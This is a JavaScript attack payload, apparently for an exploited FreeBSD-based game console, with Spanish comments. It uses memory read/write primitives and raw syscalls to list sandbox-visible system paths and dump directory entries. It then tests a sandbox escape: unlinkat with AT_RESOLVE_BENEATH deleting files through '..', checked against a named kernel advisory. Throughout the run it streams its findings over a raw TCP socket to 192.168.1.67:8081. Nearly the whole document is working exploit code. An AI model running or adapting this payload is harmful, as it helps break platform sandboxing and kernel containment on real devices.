// fs_probe_1320: probe superficie FS desde sandbox + test AT_RESOLVE_BENEATH (SA-26:42/CVE-2026-49421). Canal base p10_rfork: W() TCP crudo 192.168.1.67:8081 (0x911F/0x4301A8C0).
// syscall.h (kstuff-13/freebsd-headers/sys): read3(:12) write4(:13) open5(:14) close6(:15) unlink10(:19) mkdir136(:142) rmdir137(:143) getdirentries196(:186) openat499(:418) unlinkat503(:422); verif. sin uso: rename128(:134) fstat189(:180).
// CORRECCIONES enunciado: 500=readlinkat(:419) 501=renameat(:420) 498=mknodat(:417) mkdirat=496(:415); funlinkat AUSENTE en este arbol (solo 13/14/15+) -> no se usa; unlinkat real=503.
// fcntl.h: O_RDONLY0(:73) O_WRONLY1(:74) O_RDWR2(:75) O_CREAT0x200(:102) O_TRUNC0x400(:103) O_DIRECTORY0x20000(:119 NO 0x10000); AT_EACCESS0x100(:198) AT_SYMLINK_NOFOLLOW0x200(:199) AT_REMOVEDIR0x800(:201). AT_RESOLVE_BENEATH NO definido en fcntl.h local (gen 11.0) -> se sondea 0x2000 (EINVAL=no existe en 11.0, SA CERRADO; ok=existe, codigo 13.x+). errno.h ENOTCAPABLE93(:177).
// Reglas: escribir solo en <dir>/fuzz_probe (+test_esc.out PROPIO en padre, creado+borrado P4c). Buculos acotados. W antes de cada syscall. Sin mmap/thr_new/rfork.
(()=>{
const B=(x)=>BigInt(x),I=(x)=>BigInt.asIntN(64,x),WB=malloc(512);let sock=-1n;
const Y=331n,S_RD=3n,S_WR=4n,S_OP=5n,S_CL=6n,S_UNL=10n,S_MK=136n,S_RM=137n,S_GDE=196n,S_OAT=499n,S_UAT=503n,O_CWT=0x601n,ARB=0x2000n;
const EL={1:"EPERM",2:"ENOENT",13:"EACCES",17:"EEXIST",20:"ENOTDIR",21:"EISDIR",22:"EINVAL",30:"EROFS",66:"ENOTEMPTY",78:"ENOSYS",93:"ENOTCAPABLE"};
const ELM=(e)=>EL[e]!==undefined?EL[e]:"?";
const W=(s)=>{if(sock<0n)return;try{const t=String(s)+"\n";let n=t.length;if(n>511)n=511;for(let i=0;i<n;i++)write8(WB+BigInt(i),t.charCodeAt(i)&255);syscall(SYSCALL.write,sock,WB,BigInt(n));}catch(e){}};
const E=(n,s)=>W("[fsp] PASO "+n+": "+s+" - ejecutando"),R=(n,v)=>W("[fsp] PASO "+n+" result: "+v);
const N=(s)=>{try{send_notification(s)}catch(e){}};
const EN=()=>{try{const m=/^(\d+)/.exec(get_error_string());return m?parseInt(m[1],10):-1}catch(e){return -1}};
const J=(e)=>" errno="+e+"("+ELM(e)+")";
const PS=(b,s)=>{let n=0;for(;n<s.length&&n<63;n++)write8(b+BigInt(n),s.charCodeAt(n)&255);write8(b+BigInt(n),0);return b};
const PB=malloc(512),P1=malloc(64),P2=malloc(64),P3=malloc(64),P4=malloc(64),DB=malloc(0x1000),BP=malloc(8),RB=malloc(32),AB=malloc(32);
for(let i=0;i<16;i++)write8(AB+BigInt(i),0x41);
const HEX=(b,n)=>{let x="";for(let i=0;i<n;i++){const v=Number(read8(b+BigInt(i)))&255;x+=(v<16?"0":"")+v.toString(16)+" "}return x};
const STR=(b,n)=>{let x="";for(let i=0;i<n;i++){const v=Number(read8(b+BigInt(i)))&255;if(v>=32&&v<127)x+=String.fromCharCode(v)}return x};
try{sock=I(syscall(SYSCALL.socket,2n,1n,0n));if(sock<0n)sock=-1n;else{const sa=malloc(16);write8(sa,16);write8(sa+1n,2);write16(sa+2n,0x911Fn);write32(sa+4n,0x4301A8C0n);write64(sa+8n,0n);const cr=I(syscall(SYSCALL.connect,sock,sa,16n));if(cr<0n){syscall(SYSCALL.close,sock);sock=-1n;}}}catch(e){sock=-1n;}
// P1
const PATHS=["/","/app0","/data","/data/","/temp","/user","/user/temp","/mnt","/mnt/usb0","/system","/update","/host","/preinst","/retro","/external","/sound0"];
E(1,"16x open(O_RDONLY)");
const vis=[];
for(let i=0;i<16;i++){try{const fd=I(syscall(S_OP,PS(PB+BigInt(i*32),PATHS[i]),0n));
if(fd<0n){const e=EN();W("[fsp] P1 "+PATHS[i]+J(e));}
else{W("[fsp] P1 "+PATHS[i]+" -> fd="+fd+" OK");vis.push(i);syscall(S_CL,fd);}}
catch(ex){}}
R(1,"visibles "+vis.length+"/16: "+vis.map(i=>PATHS[i]).join(" "));
// P2 getdirentries+hex64
E(2,"getdirentries cap 4 dirs");
let nd=0;
for(let k=0;k<vis.length&&nd<4;k++){const idx=vis[k],pth=PATHS[idx];
const fd=I(syscall(S_OP,PB+BigInt(idx*32),0n));if(fd<0n){W("[fsp] P2 reopen "+pth+J(EN()));continue;}
nd++;write64(BP,0n);
W("[fsp] P2 getdirentries("+pth+",0x1000)");
const r=I(syscall(S_GDE,fd,DB,0x1000n,BP));
if(r<0n)W("[fsp] P2 "+pth+J(EN()));
else if(r===0n)W("[fsp] P2 "+pth+" ok: dir vacia");
else W("[fsp] P2 "+pth+" ok n="+r+" hex: "+HEX(DB,64));
syscall(S_CL,fd);}
if(nd===0)W("[fsp] P2 SKIPPED: sin dirs listables");
// P3 lifecycle
E(3,"lifecycle escritura candidato");
let wd=null;const CAND=["/data","/temp","/user/temp"];
for(let ci=0;ci<3;ci++){const d=CAND[ci];PS(P1,d+"/fuzz_probe");
W("[fsp] P3 mkdir("+d+"/fuzz_probe,0777)");
const m=I(syscall(S_MK,P1,0x1ffn));let okm=false;
if(m>=0n){W("[fsp] P3 mkdir ok");okm=true;}
else{const e=EN();W("[fsp] P3 mkdir"+J(e));if(e===17){W("[fsp] P3 EEXIST: reutilizo");okm=true;}}
if(!okm)continue;
PS(P2,d+"/fuzz_probe/test.txt");
W("[fsp] P3 open test.txt (CWT)");
const f1=I(syscall(S_OP,P2,O_CWT,0x1ffn));
if(f1<0n){W("[fsp] P3 open"+J(EN())+" -> sig candidato");continue;}
const wn=I(syscall(S_WR,f1,AB,16n));W("[fsp] P3 write(16x0x41) -> "+wn);
syscall(S_CL,f1);
W("[fsp] P3 open O_RDONLY + read(32)");
const f2=I(syscall(S_OP,P2,0n));
if(f2<0n)W("[fsp] P3 reopen"+J(EN()));
else{const rn=I(syscall(S_RD,f2,RB,32n));let m2=rn<0n?0:Number(rn);if(m2>32)m2=32;
W("[fsp] P3 read n="+rn+" cont='"+STR(RB,m2)+"'");syscall(S_CL,f2);}
wd=d;break;}
if(wd===null)W("[fsp] P3: /data,/temp,/user/temp fallan -> sandbox FS read-only para apps (dato)");
else W("[fsp] P3 escritura OK en "+wd);
// P4 AT_RESOLVE_BENEATH
let dirfd=-1n,flagOK=false,e4b=-1,escBroke=false,rc=-2,cRan=false;
if(wd!==null){
E(4,"unlinkat + AT_RESOLVE_BENEATH=0x2000 (SA-26:42)");
PS(P1,wd+"/fuzz_probe");
W("[fsp] P4 open dirfd "+wd+"/fuzz_probe");
dirfd=I(syscall(S_OP,P1,0n));
if(dirfd<0n)W("[fsp] P4 dirfd"+J(EN())+" -> test 4 SKIPPED");
else{
PS(P2,"test.txt");
W("[fsp] P4a unlinkat(dirfd,'test.txt',0) esperado ok");
const ra=I(syscall(S_UAT,dirfd,P2,0n));
if(ra>=0n)W("[fsp] P4a ok: borrado");
else{const e=EN();W("[fsp] P4a"+J(e)+(e===78?" -> unlinkat NO IMPLEMENTADA":""));}
W("[fsp] P4b recrea test.txt (openat CWT)");
const fb=I(syscall(S_OAT,dirfd,P2,O_CWT,0x1ffn));
if(fb<0n)W("[fsp] P4b openat"+J(EN())+" -> 4b/4c SKIPPED");
else{syscall(S_WR,fb,AB,4n);syscall(S_CL,fb);
W("[fsp] P4b unlinkat(dirfd,'test.txt',AT_RESOLVE_BENEATH=0x2000)");
const rb=I(syscall(S_UAT,dirfd,P2,ARB));
if(rb>=0n){flagOK=true;W("[fsp] P4b ok: 0x2000 VALIDADO -> flag EXISTE (codigo 13.x+)");}
else{e4b=EN();
if(e4b===22)W("[fsp] P4b EINVAL -> flag 0x2000 INEXISTENTE (11.0 pura) -> SA-26:42 no aplica, CERRADO");
else W("[fsp] P4b"+J(e4b)+" DOCUMENTAR"+(e4b===2?" (anomalo: fichero existia)":""));}
if(flagOK){
PS(P3,"test2.txt");
const f2c=I(syscall(S_OAT,dirfd,P3,O_CWT,0x1ffn));let canC=f2c>=0n;
if(canC){syscall(S_WR,f2c,AB,4n);syscall(S_CL,f2c);}
else W("[fsp] P4c create test2.txt"+J(EN())+" -> 4c SKIPPED");
if(canC){
PS(P4,wd+"/test_esc.out");
const fe=I(syscall(S_OP,P4,O_CWT,0x1ffn));
if(fe>=0n){syscall(S_WR,fe,AB,4n);syscall(S_CL,fe);}
else W("[fsp] P4c create "+wd+"/test_esc.out"+J(EN())+" (padre RO)");
PS(P3,"../fuzz_probe/test2.txt");cRan=true;
W("[fsp] P4c unlinkat(dirfd,'../fuzz_probe/test2.txt',0x2000)");
rc=Number(I(syscall(S_UAT,dirfd,P3,ARB)));
if(rc>=0){escBroke=true;
W("[fsp] P4c ok: borro A TRAVES DE '..' con el flag puesto");
W("[fsp] !!!!!!! CONTENCION ROTA: AT_RESOLVE_BENEATH validado pero DESCARTADO antes del path lookup -> BUG SA-26:42/CVE-2026-49421 VIVO EN ESTA KERNEL !!!!!!!");
N("[fsp] SA-26:42 VIVO: contencion AT_RESOLVE_BENEATH rota");}
else{const e=EN();
if(e===2)W("[fsp] P4c ENOENT: '..' BLOQUEADO -> kernel PARCHADA: SA-26:42 CERRADO");
else W("[fsp] P4c"+J(e)+" DOCUMENTAR (esp ENOENT=2 si parchada)");}
PS(P3,"../test_esc.out");
W("[fsp] P4c unlinkat('../test_esc.out',0x2000)");
const rd=I(syscall(S_UAT,dirfd,P3,ARB));
if(rd>=0n)W("[fsp] P4c directa ok: borro FUERA via '..'");
else W("[fsp] P4c directa"+J(EN()));
const cu=I(syscall(S_UNL,P4));W("[fsp] P4c rm esc: "+(cu>=0n?"ok":"errno="+EN()));
if(rc<0){PS(P3,"test2.txt");const cz=I(syscall(S_UAT,dirfd,P3,0n));W("[fsp] P4c rm test2: "+(cz>=0n?"ok":"errno="+EN()));}
}}}}
}else W("[fsp] PASO 4: SKIPPED (P3 sin dir)");
// P5: limpieza
if(wd!==null){
E(5,"limpieza");
if(dirfd>=0n)syscall(S_CL,dirfd);
PS(P2,wd+"/fuzz_probe/test.txt");syscall(S_UNL,P2);
PS(P3,wd+"/fuzz_probe/test2.txt");syscall(S_UNL,P3);
PS(P1,wd+"/fuzz_probe");
W("[fsp] P5 rmdir("+wd+"/fuzz_probe)");
const rr=I(syscall(S_RM,P1));
if(rr>=0n)R(5,"rmdir ok: fuzz_probe eliminado");
else{const e=EN();R(5,"rmdir"+J(e));}}
else R(5,"SKIPPED (nada creado)");
// P6: resumen + veredicto
let fv;
if(wd===null||dirfd<0n)fv="incompleto (sin dir/dirfd)";
else if(escBroke)fv="EXISTE y ROTO: '..' no bloqueado -> SA-26:42 VIVO";
else if(flagOK&&cRan)fv="existe, '..' bloqueado -> kernel PARCHADO (SA CERRADO)";
else if(flagOK)fv="existe, test contencion no ejecuto";
else if(e4b===22)fv="NO existe (EINVAL): 11.0 pura -> SA-26:42 no aplica (CERRADO)";
else fv="sondeo"+J(e4b);
W("[fsp] RESUMEN visible("+vis.length+"/16): "+vis.map(i=>PATHS[i]).join(" "));
W("[fsp] RESUMEN escritura: "+(wd?wd+"/fuzz_probe lifecycle completo":"ninguno (FS read-only para apps)"));
W("[fsp] RESUMEN AT_RESOLVE_BENEATH(0x2000):"+fv);
const v="FS "+vis.length+"/16 vis | write:"+(wd?wd:"NO")+" | RESOLVE_BENEATH: "+fv;
N("[fsp] "+v.slice(0,90));
for(let i=0;i<10;i++){N("[fsp] "+v.slice(0,90));for(let j=0;j<3000;j++)syscall(Y);}
W("[fsp] PAYLOAD DONE");
try{if(sock>=0n)syscall(SYSCALL.close,sock);}catch(e){}
})();
